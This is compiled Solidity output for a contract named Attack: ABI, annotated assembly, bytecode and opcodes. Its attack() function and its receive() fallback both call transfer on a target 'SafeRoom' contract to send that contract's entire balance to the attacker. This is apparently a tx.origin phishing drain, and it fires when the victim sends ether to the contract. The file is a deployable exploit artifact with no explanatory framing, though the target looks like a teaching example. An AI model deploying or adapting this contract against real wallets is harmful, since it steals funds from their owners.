{
	"Attack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract SafeRoom",
							"name": "_safeRoom",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address payable",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Attack.sol\":82:441  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"Attack.sol\":162:280  constructor (SafeRoom _safeRoom) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Attack.sol\":226:235  _safeRoom */\n  dup1\n    /* \"Attack.sol\":206:214  safeRoom */\n  0x01\n  0x00\n    /* \"Attack.sol\":206:236  safeRoom = SafeRoom(_safeRoom) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Attack.sol\":262:272  msg.sender */\n  caller\n    /* \"Attack.sol\":246:251  owner */\n  0x00\n  dup1\n    /* \"Attack.sol\":246:273  owner = payable(msg.sender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Attack.sol\":162:280  constructor (SafeRoom _safeRoom) {... */\n  pop\n    /* \"Attack.sol\":82:441  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:680   */\ntag_12:\n    /* \"#utility.yul\":621:628   */\n  0x00\n    /* \"#utility.yul\":650:674   */\n  tag_23\n    /* \"#utility.yul\":668:673   */\n  dup3\n    /* \"#utility.yul\":650:674   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":639:674   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:680   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":686:840   */\ntag_13:\n    /* \"#utility.yul\":775:815   */\n  tag_25\n    /* \"#utility.yul\":809:814   */\n  dup2\n    /* \"#utility.yul\":775:815   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":768:773   */\n  dup2\n    /* \"#utility.yul\":765:816   */\n  eq\n    /* \"#utility.yul\":755:834   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":830:831   */\n  0x00\n    /* \"#utility.yul\":827:828   */\n  dup1\n    /* \"#utility.yul\":820:832   */\n  revert\n    /* \"#utility.yul\":755:834   */\ntag_26:\n    /* \"#utility.yul\":686:840   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":846:1021   */\ntag_14:\n    /* \"#utility.yul\":919:924   */\n  0x00\n    /* \"#utility.yul\":950:956   */\n  dup2\n    /* \"#utility.yul\":944:957   */\n  mload\n    /* \"#utility.yul\":935:957   */\n  swap1\n  pop\n    /* \"#utility.yul\":966:1015   */\n  tag_28\n    /* \"#utility.yul\":1009:1014   */\n  dup2\n    /* \"#utility.yul\":966:1015   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":846:1021   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1027:1410   */\ntag_3:\n    /* \"#utility.yul\":1113:1119   */\n  0x00\n    /* \"#utility.yul\":1162:1164   */\n  0x20\n    /* \"#utility.yul\":1150:1159   */\n  dup3\n    /* \"#utility.yul\":1141:1148   */\n  dup5\n    /* \"#utility.yul\":1137:1160   */\n  sub\n    /* \"#utility.yul\":1133:1165   */\n  slt\n    /* \"#utility.yul\":1130:1249   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1168:1247   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1130:1249   */\ntag_30:\n    /* \"#utility.yul\":1288:1289   */\n  0x00\n    /* \"#utility.yul\":1313:1393   */\n  tag_32\n    /* \"#utility.yul\":1385:1392   */\n  dup5\n    /* \"#utility.yul\":1376:1382   */\n  dup3\n    /* \"#utility.yul\":1365:1374   */\n  dup6\n    /* \"#utility.yul\":1361:1383   */\n  add\n    /* \"#utility.yul\":1313:1393   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1303:1393   */\n  swap2\n  pop\n    /* \"#utility.yul\":1259:1403   */\n  pop\n    /* \"#utility.yul\":1027:1410   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Attack.sol\":82:441  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Attack.sol\":82:441  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"Attack.sol\":423:431  attack() */\n      tag_7\n        /* \"Attack.sol\":423:429  attack */\n      tag_8\n        /* \"Attack.sol\":423:431  attack() */\n      jump\t// in\n    tag_7:\n        /* \"Attack.sol\":82:441  contract Attack {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Attack.sol\":104:132  address payable public owner */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Attack.sol\":286:380  function attack () public {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      tag_15\n      tag_8\n      jump\t// in\n    tag_15:\n      stop\n    tag_8:\n        /* \"Attack.sol\":322:330  safeRoom */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":322:339  safeRoom.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"Attack.sol\":340:345  owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":355:363  safeRoom */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Attack.sol\":347:372  address(safeRoom).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Attack.sol\":322:373  safeRoom.transfer(owner, address(safeRoom).balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap3\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"Attack.sol\":286:380  function attack () public {... */\n      jump\t// out\n        /* \"Attack.sol\":104:132  address payable public owner */\n    tag_11:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_22:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:243   */\n    tag_23:\n        /* \"#utility.yul\":184:191   */\n      0x00\n        /* \"#utility.yul\":213:237   */\n      tag_35\n        /* \"#utility.yul\":231:236   */\n      dup3\n        /* \"#utility.yul\":213:237   */\n      tag_22\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":202:237   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":249:391   */\n    tag_24:\n        /* \"#utility.yul\":352:384   */\n      tag_37\n        /* \"#utility.yul\":378:383   */\n      dup2\n        /* \"#utility.yul\":352:384   */\n      tag_23\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":347:350   */\n      dup3\n        /* \"#utility.yul\":340:385   */\n      mstore\n        /* \"#utility.yul\":249:391   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":397:651   */\n    tag_13:\n        /* \"#utility.yul\":506:510   */\n      0x00\n        /* \"#utility.yul\":544:546   */\n      0x20\n        /* \"#utility.yul\":533:542   */\n      dup3\n        /* \"#utility.yul\":529:547   */\n      add\n        /* \"#utility.yul\":521:547   */\n      swap1\n      pop\n        /* \"#utility.yul\":557:644   */\n      tag_39\n        /* \"#utility.yul\":641:642   */\n      0x00\n        /* \"#utility.yul\":630:639   */\n      dup4\n        /* \"#utility.yul\":626:643   */\n      add\n        /* \"#utility.yul\":617:623   */\n      dup5\n        /* \"#utility.yul\":557:644   */\n      tag_24\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":397:651   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":657:717   */\n    tag_25:\n        /* \"#utility.yul\":685:688   */\n      0x00\n        /* \"#utility.yul\":706:711   */\n      dup2\n        /* \"#utility.yul\":699:711   */\n      swap1\n      pop\n        /* \"#utility.yul\":657:717   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":723:865   */\n    tag_26:\n        /* \"#utility.yul\":773:782   */\n      0x00\n        /* \"#utility.yul\":806:859   */\n      tag_42\n        /* \"#utility.yul\":824:858   */\n      tag_43\n        /* \"#utility.yul\":833:857   */\n      tag_44\n        /* \"#utility.yul\":851:856   */\n      dup5\n        /* \"#utility.yul\":833:857   */\n      tag_22\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":824:858   */\n      tag_25\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":806:859   */\n      tag_22\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":793:859   */\n      swap1\n      pop\n        /* \"#utility.yul\":723:865   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":871:997   */\n    tag_27:\n        /* \"#utility.yul\":921:930   */\n      0x00\n        /* \"#utility.yul\":954:991   */\n      tag_46\n        /* \"#utility.yul\":985:990   */\n      dup3\n        /* \"#utility.yul\":954:991   */\n      tag_26\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":941:991   */\n      swap1\n      pop\n        /* \"#utility.yul\":871:997   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1003:1137   */\n    tag_28:\n        /* \"#utility.yul\":1061:1070   */\n      0x00\n        /* \"#utility.yul\":1094:1131   */\n      tag_48\n        /* \"#utility.yul\":1125:1130   */\n      dup3\n        /* \"#utility.yul\":1094:1131   */\n      tag_27\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1081:1131   */\n      swap1\n      pop\n        /* \"#utility.yul\":1003:1137   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1143:1290   */\n    tag_29:\n        /* \"#utility.yul\":1238:1283   */\n      tag_50\n        /* \"#utility.yul\":1277:1282   */\n      dup2\n        /* \"#utility.yul\":1238:1283   */\n      tag_28\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1233:1236   */\n      dup3\n        /* \"#utility.yul\":1226:1284   */\n      mstore\n        /* \"#utility.yul\":1143:1290   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1296:1373   */\n    tag_30:\n        /* \"#utility.yul\":1333:1340   */\n      0x00\n        /* \"#utility.yul\":1362:1367   */\n      dup2\n        /* \"#utility.yul\":1351:1367   */\n      swap1\n      pop\n        /* \"#utility.yul\":1296:1373   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1379:1497   */\n    tag_31:\n        /* \"#utility.yul\":1466:1490   */\n      tag_53\n        /* \"#utility.yul\":1484:1489   */\n      dup2\n        /* \"#utility.yul\":1466:1490   */\n      tag_30\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1461:1464   */\n      dup3\n        /* \"#utility.yul\":1454:1491   */\n      mstore\n        /* \"#utility.yul\":1379:1497   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1503:1851   */\n    tag_18:\n        /* \"#utility.yul\":1632:1636   */\n      0x00\n        /* \"#utility.yul\":1670:1672   */\n      0x40\n        /* \"#utility.yul\":1659:1668   */\n      dup3\n        /* \"#utility.yul\":1655:1673   */\n      add\n        /* \"#utility.yul\":1647:1673   */\n      swap1\n      pop\n        /* \"#utility.yul\":1683:1762   */\n      tag_55\n        /* \"#utility.yul\":1759:1760   */\n      0x00\n        /* \"#utility.yul\":1748:1757   */\n      dup4\n        /* \"#utility.yul\":1744:1761   */\n      add\n        /* \"#utility.yul\":1735:1741   */\n      dup6\n        /* \"#utility.yul\":1683:1762   */\n      tag_29\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1772:1844   */\n      tag_56\n        /* \"#utility.yul\":1840:1842   */\n      0x20\n        /* \"#utility.yul\":1829:1838   */\n      dup4\n        /* \"#utility.yul\":1825:1843   */\n      add\n        /* \"#utility.yul\":1816:1822   */\n      dup5\n        /* \"#utility.yul\":1772:1844   */\n      tag_31\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1503:1851   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122078d825bb79071941f33449545a145abe18e89253ef4767fec42ac61c453fd9e564736f6c63430008090033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405161042e38038061042e8339818101604052810190610032919061012e565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b60006100fb826100de565b9050919050565b61010b816100f0565b811461011657600080fd5b50565b60008151905061012881610102565b92915050565b600060208284031215610144576101436100b9565b5b600061015284828501610119565b91505092915050565b6102c48061016a6000396000f3fe60806040526004361061002d5760003560e01c80638da5cb5b146100415780639e5faafc1461006c5761003c565b3661003c5761003a610083565b005b600080fd5b34801561004d57600080fd5b5061005661016d565b60405161006391906101d2565b60405180910390f35b34801561007857600080fd5b50610081610083565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b8152600401610139929190610265565b600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101bc82610191565b9050919050565b6101cc816101b1565b82525050565b60006020820190506101e760008301846101c3565b92915050565b6000819050919050565b600061021261020d61020884610191565b6101ed565b610191565b9050919050565b6000610224826101f7565b9050919050565b600061023682610219565b9050919050565b6102468161022b565b82525050565b6000819050919050565b61025f8161024c565b82525050565b600060408201905061027a600083018561023d565b6102876020830184610256565b939250505056fea264697066735822122078d825bb79071941f33449545a145abe18e89253ef4767fec42ac61c453fd9e564736f6c63430008090033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x42E CODESIZE SUB DUP1 PUSH2 0x42E DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x12E JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x15B JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE9 DUP3 PUSH2 0xBE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xFB DUP3 PUSH2 0xDE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10B DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP2 EQ PUSH2 0x116 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x128 DUP2 PUSH2 0x102 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x144 JUMPI PUSH2 0x143 PUSH2 0xB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x152 DUP5 DUP3 DUP6 ADD PUSH2 0x119 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2C4 DUP1 PUSH2 0x16A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x41 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x6C JUMPI PUSH2 0x3C JUMP JUMPDEST CALLDATASIZE PUSH2 0x3C JUMPI PUSH2 0x3A PUSH2 0x83 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x56 PUSH2 0x16D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x1D2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x78 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x81 PUSH2 0x83 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x139 SWAP3 SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BC DUP3 PUSH2 0x191 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1CC DUP2 PUSH2 0x1B1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E7 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x212 PUSH2 0x20D PUSH2 0x208 DUP5 PUSH2 0x191 JUMP JUMPDEST PUSH2 0x1ED JUMP JUMPDEST PUSH2 0x191 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x224 DUP3 PUSH2 0x1F7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x236 DUP3 PUSH2 0x219 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x246 DUP2 PUSH2 0x22B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x25F DUP2 PUSH2 0x24C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x27A PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x23D JUMP JUMPDEST PUSH2 0x287 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x256 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH25 0xD825BB79071941F33449545A145ABE18E89253EF4767FEC42A 0xC6 SHR GASLIMIT EXTCODEHASH 0xD9 0xE5 PUSH5 0x736F6C6343 STOP ADDMOD MULMOD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "141600",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"owner()": "2489"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"owner()": "8da5cb5b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "Attack.sol:Attack",
						"label": "owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 7,
						"contract": "Attack.sol:Attack",
						"label": "safeRoom",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(SafeRoom)118"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(SafeRoom)118": {
						"encoding": "inplace",
						"label": "contract SafeRoom",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}